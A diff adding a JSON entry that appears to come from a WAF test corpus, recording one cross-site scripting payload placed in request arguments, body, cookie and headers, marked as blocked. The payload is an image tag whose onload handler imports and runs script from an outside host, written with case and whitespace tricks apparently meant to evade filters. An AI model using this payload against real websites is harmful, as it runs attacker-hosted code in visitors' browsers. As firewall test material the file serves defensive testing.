@@ -1,0 +1,15 @@
+{
+  "payload": [
+    {
+      "ARGS": "<Img Src=//X55.is OnLoad%0C=import(Src)>",
+      "BODY": "<Img Src=//X55.is OnLoad%0C=import(Src)>",
+      "COOKIE": "<Img Src=//X55.is OnLoad%0C=import(Src)>",
+      "USER-AGENT": "<Img Src=//X55.is OnLoad%0C=import(Src)>",
+      "REFERER": "<Img Src=//X55.is OnLoad%0C=import(Src)>",
+      "HEADER": "<Img Src=//X55.is OnLoad%0C=import(Src)>",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "source": "@KN0X55"
+}
